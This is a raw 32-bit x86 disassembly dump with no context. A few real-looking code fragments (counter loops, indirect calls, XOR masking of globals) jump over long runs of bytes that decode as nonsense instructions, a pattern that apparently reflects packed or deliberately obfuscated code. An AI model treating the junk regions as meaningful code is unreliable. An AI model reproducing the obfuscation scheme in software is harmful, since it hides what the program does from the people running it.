  40e7c2:	loop   0x40e819
  40e7c4:	loop   0x40e7d9
  40e7c6:	adc    esi,edi
  40e7c8:	sbb    edx,0x5d
  40e7cb:	jb     0x40e7bd
  40e7cd:	les    esp,FWORD PTR [eax-0x66]
  40e7d0:	rcr    BYTE PTR [edi],0x89
  40e7d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7d4:	ret    0x34cf
  40e7d7:	jge    0x40e829
  40e7d9:	daa    
  40e7da:	cmp    al,0xa3
  40e7dc:	or     ah,dh
  40e7de:	in     al,0xd6
  40e7e0:	mov    ah,0x5b
  40e7e2:	scas   al,BYTE PTR es:[edi]
  40e7e3:	add    eax,0x3212e82e
  40e7e8:	pop    ds
  40e7e9:	sbb    eax,0x5997dadb
  40e7ee:	inc    ebp
  40e7ef:	sbb    al,0xe6
  40e7f1:	jmp    0x3bb5:0x3396fd79
  40e7f8:	neg    esi
  40e7fa:	mov    dl,0xc4
  40e7fc:	outs   dx,BYTE PTR ds:[esi]
  40e7fd:	xor    edi,eax
  40e7ff:	jne    0x40e791
  40e801:	or     al,0x24
  40e803:	jne    0x40e87a
  40e805:	or     al,0x8b
  40e807:	jb     0x40e829
  40e809:	pop    esp
  40e80a:	aas    
  40e80b:	mov    dl,0xf5
  40e80d:	pop    ds
  40e80e:	and    al,0xcf
  40e810:	loope  0x40e813
  40e812:	sub    ebp,edx
  40e814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e815:	out    dx,al
  40e816:	pop    edx
  40e817:	push   0x7c
  40e819:	mov    ecx,DWORD PTR [edi+0x2f6479c2]
  40e81f:	test   bh,dh
  40e821:	pop    ebx
  40e822:	mov    bh,0x86
  40e824:	jp     0x40e87a
  40e826:	push   0x3ed2cade
  40e82b:	ficom  DWORD PTR [esi-0x3f]
  40e82e:	xchg   esi,eax
  40e82f:	jge    0x40e8ac
  40e831:	or     al,0xb
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fd69,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd8d,0x42fdfe
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fd61
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e19c,0x42e76f
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e78b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fd51,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fd51
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fd51,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fd51,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fd51,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e267
  40e8ca:	call   DWORD PTR ds:0x42e4ff
  40e8d0:	cmp    DWORD PTR ds:0x42fd51,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fd51
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fd51,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fe0a
  40e8f8:	adc    DWORD PTR ds:0x42e77f,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e777,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e77b,0x42e76f
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd81
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd8d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e78b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	sbb    BYTE PTR [edx],0xc6
  40e94c:	fisub  DWORD PTR [eax+eiz*4]
  40e94f:	jo     0x40e9c1
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e9a5
  40e956:	adc    bh,BYTE PTR [edi]
  40e958:	adc    al,ah
  40e95a:	pop    esi
  40e95b:	push   eax
  40e95c:	jmp    DWORD PTR [edi+0x17]
  40e95f:	add    eax,0x73cc70cf
  40e964:	sahf   
  40e965:	inc    ecx
  40e966:	cmp    eax,0x1afeef62
  40e96b:	arpl   WORD PTR [eax+0x4024063f],bp
  40e971:	call   0x5ca5:0x156c41db
  40e978:	fsub   QWORD PTR [esi+0x1d]
  40e97b:	jns    0x40e964
  40e97d:	mov    esp,0x352fd76c
  40e982:	mov    bl,0x8d
  40e984:	fucomi st,st(3)
  40e986:	cs popa 
  40e988:	mov    edi,0x52e97646
  40e98d:	and    DWORD PTR [ecx],eax
  40e98f:	xor    DWORD PTR [edi+0x67],ebx
  40e992:	mov    esp,0xe920e704
  40e997:	loopne 0x40e9d8
  40e999:	push   ebp
  40e99a:	sub    eax,DWORD PTR [esi+0x7486561a]
  40e9a0:	fmul   QWORD PTR [edi]
  40e9a2:	jge    0x40e994
  40e9a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9a5:	aas    
  40e9a6:	pop    eax
  40e9a7:	scas   eax,DWORD PTR es:[edi]
  40e9a8:	jns    0x40e9a4
  40e9aa:	js     0x40e993
  40e9ac:	aad    0xa5
  40e9ae:	dec    esp
  40e9af:	pop    es
  40e9b0:	sbb    DWORD PTR [ebx+eax*4],0xfffffff1
  40e9b4:	add    al,0x92
  40e9b6:	dec    ebp
  40e9b7:	pop    ebx
  40e9b8:	push   esi
  40e9b9:	push   ebp
  40e9ba:	xor    bh,ah
  40e9bc:	ins    BYTE PTR es:[edi],dx
  40e9bd:	push   0xfe14b604
  40e9c2:	cli    
  40e9c3:	cmp    BYTE PTR [esi+eax*1],al
  40e9c6:	out    dx,al
  40e9c7:	jns    0x40e9c0
  40e9c9:	push   esp
  40e9ca:	xchg   ebp,eax
  40e9cb:	pop    edx
  40e9cc:	inc    ebx
  40e9cd:	cmp    BYTE PTR [eax],al
  40e9cf:	retf   
  40e9d0:	arpl   WORD PTR [edx+0x4d8296b7],bp
  40e9d6:	arpl   bx,bx
  40e9d8:	jb     0x40ea2e
  40e9da:	icebp  
  40e9db:	loopne 0x40e9f6
  40e9dd:	inc    ecx
  40e9de:	outs   dx,BYTE PTR ds:[esi]
  40e9df:	inc    edi
  40e9e0:	push   esi
  40e9e1:	mov    dh,BYTE PTR [eax+0x19]
  40e9e4:	fnsave [ecx]
  40e9e6:	mov    esi,0x244892d6
  40e9eb:	dec    eax
  40e9ec:	inc    ebx
  40e9ed:	push   ecx
  40e9ee:	and    al,0x7e
  40e9f0:	jle    0x40ea69
  40e9f2:	xlat   BYTE PTR ds:[ebx]
  40e9f3:	test   DWORD PTR [edx+0x3dd1619e],0xfbc0f4d5
  40e9fd:	call   0x1784:0x314d7c6e
  40ea04:	in     al,0x15
  40ea06:	cmp    ah,BYTE PTR [edx-0x52d233f0]
  40ea0c:	push   0x891b465a
  40ea11:	mov    esp,DWORD PTR [ebx+0x20515049]
  40ea17:	and    ebx,ebp
  40ea19:	inc    edi
  40ea1a:	sbb    cl,ch
  40ea1c:	inc    edx
  40ea1d:	adc    ch,BYTE PTR [edi]
  40ea1f:	imul   ebx,ebp,0x37811b7c
  40ea25:	sbb    al,0x68
  40ea27:	xor    bh,BYTE PTR [edi-0xb]
  40ea2a:	inc    eax
  40ea2b:	sahf   
  40ea2c:	push   ecx
  40ea2d:	shr    DWORD PTR [eax-0x30],0xa6
  40ea31:	xor    BYTE PTR [ecx+0x71],bh
  40ea34:	mov    ds:0x35d8bbe5,eax
  40ea39:	sub    BYTE PTR [edx-0x1b],0x75
  40ea3d:	jae    0x40ea12
  40ea3f:	pop    edi
  40ea40:	dec    edx
  40ea41:	xchg   esi,eax
  40ea42:	aaa    
  40ea43:	inc    ecx
  40ea44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea45:	int3   
  40ea46:	fwait
  40ea47:	mov    bh,0x80
  40ea49:	and    eax,0x8b97e7e0
  40ea4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea4f:	push   ds
  40ea50:	jmp    0x6385:0x950bb87f
  40ea57:	popf   
  40ea58:	jge    0x40ea40
  40ea5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea5b:	pop    ebx
  40ea5c:	push   cs
  40ea5d:	not    DWORD PTR [eax]
  40ea5f:	pop    edi
  40ea60:	in     eax,dx
  40ea61:	mov    cl,0x25
  40ea63:	and    BYTE PTR [eax],dh
  40ea65:	push   cs
  40ea66:	je     0x40ea85
  40ea68:	int    0xb9
  40ea6a:	dec    edi
  40ea6b:	test   ecx,0x7b9b7bd9
  40ea71:	jae    0x40ea28
  40ea73:	mov    eax,ds:0x679666c5
  40ea78:	outs   dx,BYTE PTR ds:[esi]
  40ea79:	sub    al,0x9f
  40ea7b:	imul   edx,DWORD PTR [ecx+0x78dd7aa0],0xa3caeab4
  40ea85:	jmp    0xd53bc314
  40ea8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea8b:	adc    BYTE PTR [ebp+0x50326cd8],0x72
  40ea92:	std    
  40ea93:	(bad)  
  40ea94:	gs jmp 0x2dd18ee9
  40ea9a:	jae    0x40eb0a
  40ea9c:	(bad)  
  40ea9e:	mov    cl,0x2
  40eaa0:	inc    ebx
  40eaa1:	sbb    cl,BYTE PTR [edi]
  40eaa3:	test   DWORD PTR [esi+0x3000000],esp
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	gs std 
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e1a8,0x11
  40eade:	cmp    DWORD PTR ds:0x42e1a8,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e1a8,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e1b0
  40eafd:	push   0x42e1ef
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e38f
  40eb15:	cmp    DWORD PTR ds:0x42e1a8,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e1a8
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e1a8,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e1a8
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e1a8,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0xde
  40eb8d:	call   0xb0386176
  40eb92:	jo     0x40ec04
  40eb94:	ret    
  40eb95:	jg     0x40ec07
  40eb97:	jo     0x40ec08
  40eb99:	inc    edx
  40eb9a:	mov    ebx,0xd521eb7b
  40eb9f:	ins    BYTE PTR es:[edi],dx
  40eba0:	and    edx,DWORD PTR [esi]
  40eba2:	jae    0x40eb2e
  40eba4:	in     eax,dx
  40eba5:	sub    BYTE PTR [bp+0x1d],dl
  40eba9:	cmp    al,0x1d
  40ebab:	out    0x38,al
  40ebad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ebae:	je     0x40eb7c
  40ebb0:	sbb    BYTE PTR [ebp+esi*2+0x6f],ch
  40ebb4:	sbb    BYTE PTR ds:[edi+0x0],0xfc
  40ebb9:	and    BYTE PTR [eax-0x34],0x62
  40ebbd:	jne    0x40eb9d
  40ebbf:	mov    ecx,0x2882daa9
  40ebc4:	shl    DWORD PTR [edx+eax*2+0x30],cl
  40ebc8:	jb     0x40eba1
  40ebca:	outs   dx,BYTE PTR ds:[esi]
  40ebcb:	push   es
  40ebcc:	shr    BYTE PTR [eax-0x7ff1a193],cl
  40ebd2:	xchg   esp,eax
  40ebd3:	pushf  
  40ebd4:	or     al,0x6e
  40ebd6:	iret   
  40ebd7:	adc    BYTE PTR [ebx-0x2e48bc39],bl
  40ebdd:	mov    ebx,edx
  40ebdf:	push   edx
  40ebe0:	rol    BYTE PTR [eax+0x47e2b891],1
  40ebe6:	sbb    BYTE PTR [ecx],al
  40ebe8:	mov    ds:0xf953d6f,eax
  40ebed:	mov    eax,DWORD PTR [ebx+eax*1-0x4457a05c]
  40ebf4:	pop    ds
  40ebf5:	das    
  40ebf6:	mov    ecx,0xcbfab941
  40ebfb:	leave  
  40ebfc:	cld    
  40ebfd:	mov    eax,ds:0x89a80f35
  40ec02:	lea    ecx,[ebx+0x54]
  40ec05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec06:	std    
  40ec07:	pushf  
  40ec08:	fdiv   st,st(0)
  40ec0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec0b:	movq   mm0,QWORD PTR [eax+0x5e]
  40ec0f:	ins    BYTE PTR es:[edi],dx
  40ec10:	pop    edx
  40ec11:	mov    ah,0x90
  40ec13:	and    edx,esi
  40ec15:	aad    0x83
  40ec17:	adc    BYTE PTR [eax],cl
  40ec19:	scas   al,BYTE PTR es:[edi]
  40ec1a:	or     eax,0xfaec5fdf
  40ec1f:	dec    edi
  40ec20:	aas    
  40ec21:	xor    BYTE PTR [esi+0x47],cl
  40ec24:	mov    bl,0x19
  40ec26:	mov    eax,ds:0xbc60e232
  40ec2b:	shr    BYTE PTR [eax+0x12],1
  40ec2e:	xor    al,0x93
  40ec30:	fs sbb al,0xd2
  40ec33:	stos   DWORD PTR es:[edi],eax
  40ec34:	xor    BYTE PTR ds:0xc865a41f,bl
  40ec3a:	lock ror bh,0x9a
  40ec3e:	sub    cl,BYTE PTR [ebp-0x12]
  40ec41:	push   esi
  40ec42:	leave  
  40ec43:	lods   eax,DWORD PTR ds:[esi]
  40ec44:	es leave 
  40ec46:	test   ah,bl
  40ec48:	lahf   
  40ec49:	jb     0x40ec04
  40ec4b:	mov    esp,0x6a8890cf
  40ec50:	mov    eax,0xe750eae3
  40ec55:	xor    BYTE PTR [eax+0x51],al
  40ec58:	add    DWORD PTR [edx],esp
  40ec5a:	fcmovnb st,st(7)
  40ec5c:	adc    BYTE PTR [ebx],0xf
  40ec5f:	ror    DWORD PTR [esi+0x36],cl
  40ec62:	push   cs
  40ec63:	pop    ecx
  40ec64:	mov    edi,0x9cf869c5
  40ec69:	or     bh,dh
  40ec6b:	dec    ebp
  40ec6c:	push   ebx
  40ec6d:	push   esi
  40ec6e:	xchg   DWORD PTR [edi+0x4a],ecx
  40ec71:	add    al,0xfb
  40ec73:	mov    esi,0xb03d268a
  40ec78:	sub    ah,al
  40ec7a:	stos   BYTE PTR es:[edi],al
  40ec7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec7c:	stc    
  40ec7d:	xor    al,0xa2
  40ec7f:	bound  ebp,QWORD PTR [ecx-0x23]
  40ec82:	out    dx,al
  40ec83:	test   BYTE PTR [edi+0x5d284bc],0x9b
  40ec8a:	adc    al,0xf7
  40ec8c:	adc    al,0x25
  40ec8e:	lahf   
  40ec8f:	ins    BYTE PTR es:[edi],dx
  40ec90:	js     0x40ec61
  40ec92:	mov    ds:0xc6c186f2,eax
  40ec97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec98:	(bad)  
  40ec9a:	and    DWORD PTR [edi+0x4c],edi
  40ec9d:	xchg   edi,eax
  40ec9e:	loop   0x40ec2d
  40eca0:	shl    ecx,1
  40eca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eca3:	es ds fptan 
  40eca7:	ds (bad) 
  40eca9:	fsubr  DWORD PTR [ebp-0x75]
  40ecac:	outs   dx,BYTE PTR ds:[esi]
  40ecad:	mov    al,ds:0x5478cc
  40ecb2:	(bad)  
  40ecb3:	out    0x22,al
  40ecb5:	push   esi
  40ecb6:	adc    eax,DWORD PTR [ebx]
  40ecb8:	jnp    0x40ec6b
  40ecba:	dec    ebp
  40ecbb:	push   esp
  40ecbc:	repz cmp dl,cl
  40ecbf:	inc    ecx
  40ecc0:	mov    al,0x7a
  40ecc2:	aam    0x2a
  40ecc4:	lock rcl DWORD PTR gs:[eax-0xb7ab381],1
  40eccc:	out    0xb5,eax
  40ecce:	loopne 0x40ed46
  40ecd0:	dec    ebp
  40ecd1:	jecxz  0x40ecd4
  40ecd3:	(bad)  
  40ecd4:	pop    edx
  40ecd5:	jae    0x40ed0c
  40ecd7:	sar    BYTE PTR [edx-0x6ec1c12b],1
  40ecdd:	jl     0x40ec63
  40ecdf:	sub    DWORD PTR [eax-0x4d4e0a13],0x458bc13b
  40ece9:	in     al,dx
  40ecea:	movzx  ecx,WORD PTR [ebp-0x4]
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ecee
  40ed00:	mul    DWORD PTR [eax+0x33]
  40ed03:	mov    edx,0xc37070ae
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ecba
  40ed0c:	mov    ch,0xc4
  40ed0e:	out    0xcb,al
  40ed10:	add    ebp,DWORD PTR [ecx+0x58]
  40ed13:	(bad)  
  40ed14:	aam    0xf3
  40ed16:	outs   dx,DWORD PTR ds:[esi]
  40ed17:	adc    BYTE PTR [edx],0xd9
  40ed1a:	inc    edx
  40ed1b:	pop    es
  40ed1c:	rcr    BYTE PTR gs:[eax+edx*2],0x8d
  40ed21:	hlt    
  40ed22:	and    DWORD PTR [esi-0x2405cfe4],esp
  40ed28:	and    DWORD PTR [edi],ebp
  40ed2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed2b:	mov    edx,0x83a60c5b
  40ed30:	mov    BYTE PTR [eax+0x17],ah
  40ed33:	mov    esi,0xc08786bc
  40ed38:	retf   0x5957
  40ed3b:	rol    cl,cl
  40ed3d:	pop    ecx
  40ed3e:	pusha  
  40ed3f:	lods   eax,DWORD PTR ds:[esi]
  40ed40:	adc    edi,DWORD PTR [ebx+0x6db00d24]
  40ed46:	cmp    dh,ch
  40ed48:	and    esp,DWORD PTR [edi+0x20]
  40ed4b:	fmulp  st(1),st
  40ed4d:	push   ebx
  40ed4e:	mov    ecx,0x873e17c9
  40ed53:	xor    eax,DWORD PTR ds:0x4952432f
  40ed59:	out    dx,eax
  40ed5a:	and    dl,BYTE PTR [ebx]
  40ed5c:	push   esi
  40ed5d:	sub    esp,edx
  40ed5f:	addr16 mov esp,0x4105b958
  40ed65:	out    0x73,al
  40ed67:	pushf  
  40ed68:	mov    ecx,0xcb418d51
  40ed6d:	sbb    esi,DWORD PTR [esi]
  40ed6f:	adc    ch,ch
  40ed71:	dec    edi
  40ed72:	mov    edx,cs
  40ed74:	mov    edx,0x6394ecea
  40ed79:	pop    esi
  40ed7a:	loop   0x40ed45
  40ed7c:	push   ebp
  40ed7d:	imul   ebx,DWORD PTR [ecx-0x16410ffc],0xa560efb0
  40ed87:	mov    esp,0xc5803f81
  40ed8c:	dec    BYTE PTR [ebp+0x2b]
  40ed8f:	and    eax,0x255c1627
  40ed94:	loope  0x40ed2c
  40ed96:	jns    0x40ed40
  40ed98:	loope  0x40ede8
  40ed9a:	xor    bh,BYTE PTR [edx-0x48410f2d]
  40eda0:	(bad)  
  40eda1:	outs   dx,DWORD PTR ds:[esi]
  40eda2:	call   0x1bfb3ce8
  40eda7:	adc    BYTE PTR [edx],cl
  40eda9:	sbb    DWORD PTR [ebp-0x56],esi
  40edac:	xor    BYTE PTR [esp+esi*2],0xef
  40edb0:	push   0xffffffee
  40edb2:	cmp    BYTE PTR [edi*2+0x746f43c],ch
  40edb9:	in     eax,0x2b
  40edbb:	mov    bl,0x86
  40edbd:	sub    esp,DWORD PTR [edi+edi*8-0x23]
  40edc1:	adc    BYTE PTR [esi],0x2b
  40edc4:	mov    esi,ebx
  40edc6:	ja     0x40ee15
  40edc8:	sub    ah,BYTE PTR [ebx+0x1bbd8fcd]
  40edce:	lods   al,BYTE PTR ds:[esi]
  40edcf:	sub    ch,al
  40edd1:	mov    ecx,0xe029067b
  40edd6:	inc    ebp
  40edd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40edd8:	or     bh,cl
  40edda:	dec    ecx
  40eddb:	push   esi
  40eddc:	jge    0x40edb5
  40edde:	and    BYTE PTR [esi-0x196d1cc7],dh
  40ede4:	imul   eax,DWORD PTR [ecx+0x26],0xffffffe4
  40ede8:	pop    ebp
  40ede9:	pop    eax
  40edea:	sbb    DWORD PTR [edi],edi
  40edec:	xor    BYTE PTR [esp+edx*4-0x31937efe],cl
  40edf3:	cmp    BYTE PTR [ebx+0x2c],0xb0
  40edf7:	push   esp
  40edf8:	popa   
  40edf9:	jmp    0x8558:0x2136e225
  40ee00:	aad    0x1d
  40ee02:	out    dx,al
  40ee03:	dec    edi
  40ee04:	not    DWORD PTR [ebp-0x65aa66ef]
  40ee0a:	mov    ss,WORD PTR [ebx-0x69]
  40ee0d:	mov    eax,0xd0e442cf
  40ee12:	mov    dh,0x41
  40ee14:	pop    eax
  40ee15:	mov    BYTE PTR [edx-0x798a69b9],dh
  40ee1b:	pushf  
  40ee1c:	lahf   
  40ee1d:	cmp    eax,DWORD PTR [edi]
  40ee1f:	add    eax,DWORD PTR ds:0xe88e1f50
  40ee25:	dec    edx
  40ee26:	cmp    ebp,DWORD PTR [edx-0x75]
  40ee29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee2a:	pushf  
  40ee2b:	mov    ch,0x85
  40ee2d:	jns    0x40edf6
  40ee2f:	jbe    0x40edc4
  40ee31:	getsec 
  40ee33:	push   edx
  40ee34:	xor    ah,BYTE PTR [edx+0x75]
  40ee37:	mov    edi,DWORD PTR [eax+0x72]
  40ee3a:	mov    al,0x3a
  40ee3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee3d:	adc    eax,0x44d2188d
  40ee42:	mov    ecx,0x2e5c2cbb
  40ee47:	push   ss
  40ee48:	pop    ecx
  40ee4a:	ins    BYTE PTR es:[edi],dx
  40ee4b:	cwde   
  40ee4c:	outs   dx,BYTE PTR ds:[esi]
  40ee4d:	call   0xa146:0x8eb46578
  40ee54:	pop    es
  40ee55:	or     ebp,DWORD PTR [ebx-0x64]
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x97
  40ee7f:	xchg   DWORD PTR [ebx+0x4e],edi
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee3b
  40ee8b:	cli    
  40ee8c:	ficom  WORD PTR [ebx+eax*2+0x1d]
  40ee90:	repnz mov edi,0x3992d379
  40ee96:	cmp    eax,0x7e3aed02
  40ee9b:	sub    BYTE PTR [esi-0x43],0x44
  40ee9f:	and    ebp,DWORD PTR [eax-0x2e]
  40eea2:	retf   
  40eea3:	and    al,0x5d
  40eea5:	fistp  QWORD PTR [eax]
  40eea7:	pop    ebx
  40eea8:	es push 0x1d
  40eeab:	fimul  DWORD PTR [esi-0x74edf37b]
  40eeb1:	push   edi
  40eeb2:	or     bh,ch
  40eeb4:	aaa    
  40eeb5:	call   0x3244:0xed5e2958
  40eebc:	and    ebp,ebp
  40eebe:	fldenv [ebx+0x39]
  40eec1:	or     ecx,esi
  40eec3:	inc    ecx
  40eec4:	loope  0x40eec9
  40eec6:	pop    ecx
  40eec7:	jmp    0xad84df3
  40eecc:	dec    ecx
  40eecd:	xchg   edx,eax
  40eece:	xchg   ebx,eax
  40eecf:	add    al,0x5f
  40eed1:	enter  0xc445,0xa6
  40eed5:	inc    ebx
  40eed6:	popa   
  40eed7:	mov    ch,0x16
  40eed9:	dec    esi
  40eeda:	jae    0x40ee7f
  40eedc:	mov    ah,0xd6
  40eede:	push   edx
  40eedf:	mov    ecx,ebx
  40eee1:	xchg   edx,eax
  40eee2:	mov    ecx,DWORD PTR [edx+ebx*4+0x5f603fa3]
  40eee9:	addr16 add ch,dh
  40eeec:	lahf   
  40eeed:	push   edx
  40eeee:	retf   0xee9b
  40eef1:	outs   dx,BYTE PTR ds:[esi]
  40eef2:	push   eax
  40eef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eef4:	xor    eax,0x2f85d4ad
  40eef9:	jp     0x40ee86
  40eefb:	fistp  QWORD PTR [eax-0x2e]
  40eefe:	adc    eax,0x77051ba7
  40ef03:	jns    0xfe246af6
  40ef09:	pop    esp
  40ef0a:	stc    
  40ef0b:	cmp    ch,BYTE PTR [ebx]
  40ef0d:	sbb    DWORD PTR [edx-0x7a002dcd],ecx
  40ef13:	and    eax,0x56b7f6b6
  40ef18:	jl     0x40ef18
  40ef1a:	push   eax
  40ef1b:	push   ss
  40ef1c:	pop    esp
  40ef1d:	pop    es
  40ef1e:	ds xor al,0x16
  40ef21:	cmp    al,BYTE PTR [edi]
  40ef23:	(bad)
  40ef26:	mov    eax,ds:0x5f0b99b0
  40ef2b:	jns    0x40eed2
  40ef2d:	fcom   QWORD PTR [esi]
  40ef2f:	retf   0x2e6e
  40ef32:	cmp    cl,ch
  40ef34:	cmp    edx,DWORD PTR [ecx+0x762f7ac9]
  40ef3a:	mov    esp,0xe2ffea83
  40ef3f:	push   ecx
  40ef40:	out    0x4f,eax
  40ef42:	lods   eax,DWORD PTR ds:[esi]
  40ef43:	test   eax,0xea0c01c8
  40ef48:	mov    ebx,?
  40ef4a:	xchg   edi,eax
  40ef4b:	pop    edx
  40ef4c:	fstp   TBYTE PTR [ebp+0x50471687]
  40ef52:	adc    ebx,DWORD PTR [esi-0x79]
  40ef55:	iret   
  40ef56:	jg     0x40ef12
  40ef58:	popf   
  40ef59:	rcr    DWORD PTR [edx-0x7b],0xf3
  40ef5d:	xor    ebx,DWORD PTR [ebx+0x76]
  40ef60:	in     al,dx
  40ef61:	bound  edx,QWORD PTR [eax+0x7e]
  40ef64:	xlat   BYTE PTR ds:[ebx]
  40ef65:	aas    
  40ef66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef67:	mov    DWORD PTR [esi],esi
  40ef69:	pop    ds
  40ef6a:	rcr    BYTE PTR [ecx],1
  40ef6c:	mov    esp,0x5975b420
  40ef71:	loope  0x40efa4
  40ef73:	xor    DWORD PTR [ebx+0x40],edx
  40ef76:	popf   
  40ef77:	loopne 0x40ef75
  40ef79:	mov    ebx,0x38a96411
  40ef7e:	pusha  
  40ef7f:	retf   0xc30a
  40ef82:	dec    ebp
  40ef83:	mov    ebp,0x63708058
  40ef88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef89:	push   ebx
  40ef8a:	xchg   edi,eax
  40ef8b:	push   ds
  40ef8c:	mov    eax,0xdef87b6f
